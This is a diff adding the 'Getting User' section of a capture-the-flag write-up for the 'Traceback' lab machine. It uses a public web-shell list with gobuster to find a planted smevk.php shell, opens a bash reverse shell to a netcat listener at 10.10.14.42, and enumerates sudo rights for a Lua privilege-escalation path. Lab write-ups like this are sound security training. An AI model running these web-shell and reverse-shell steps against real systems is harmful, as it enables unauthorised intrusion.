@@ -36,6 +36,160 @@ Nmap done: 1 IP address (1 host up) scanned in 742.50 seconds
 
 ## 2. Getting User
 
+```shell
+root@kali:~# curl -s 10.10.10.181 | tail
+</head>
+<body>
+	<center>
+		<h1>This site has been owned</h1>
+		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
+		<h3> - Xh4H - </h3>
+		<!--Some of the best web shells that you might need ;)-->
+	</center>
+</body>
+</html>
+```
+
+```shell
+root@kali:~# git clone https://github.com/TheBinitGhimire/Web-Shells.git
+
+---
+
+root@kali:~# ls Web-Shells/ > wordlist.txt
+
+root@kali:~# cat wordlist.txt 
+alfa3.php
+alfav3.0.1.php
+andela.php
+bloodsecv4.php
+by.php
+c99ud.php
+cmd.php
+configkillerionkros.php
+jspshell.jsp
+mini.php
+obfuscated-punknopass.php
+punkholic.php
+punk-nopass.php
+r57.php
+README.md
+smevk.php
+wso2.8.5.php
+```
+
+
+```shell
+root@kali:~# gobuster dir -u http://10.10.10.181 -w /root/wordlist.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.181
+[+] Threads:        10
+[+] Wordlist:       /root/wordlist.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/08/30 17:16:36 Starting gobuster
+===============================================================
+/smevk.php (Status: 200)
+===============================================================
+2020/08/30 17:16:39 Finished
+===============================================================
+```
+
+```
+root@kali:~# cat Web-Shells/smevk.php | head -n 15
+<?php 
+/*
+
+SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
+https://www.facebook.com/smevkpathan
+smevkpathan@gmail.com
+Edit Shell according to your choice.
+Domain read bypass.
+Enjoy!
+
+*/
+//Make your setting here.
+$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
+$UserName = "admin";                                      //Your UserName here.
+$auth_pass = "admin";                                  //Your Password.
+```
+
+```shell
+root@kali:~# nc -nlvp 4443
+listening on [any] 4443 ...
+
+```
+
+
+```shell
+bash -c 'bash -i >& /dev/tcp/10.10.14.42/4443 0>&1'
+```
+
+```shell
+root@kali:~# nc -nlvp 4443
+listening on [any] 4443 ...
+connect to [10.10.14.42] from (UNKNOWN) [10.10.10.181] 35966
+bash: cannot set terminal process group (525): Inappropriate ioctl for device
+bash: no job control in this shell
+webadmin@traceback:/var/www/html$ whoami
+whoami
+webadmin
+```
+
+```shell
+
+webadmin@traceback:/home/webadmin$ ls -la
+ls -la
+total 44
+drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
+drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
+-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
+-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
+-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
+drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
+drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
+-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
+-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
+drwxrwxr-x 2 webadmin webadmin 4096 Feb 27  2020 .ssh
+-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
+```
+
+```shell
+webadmin@traceback:/home/webadmin$ cat note.txt	
+cat note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+```
+
+```shell
+webadmin@traceback:/home/webadmin$ sudo -l
+sudo -l
+Matching Defaults entries for webadmin on traceback:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on traceback:
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+```
+
+
+```shell
+webadmin@traceback:/home/webadmin$ cat .bash_history
+cat .bash_history
+ls -la
+sudo -l
+nano privesc.lua
+sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+rm privesc.lua
+logout
+```
+
 
 ## 3. Getting Root
 
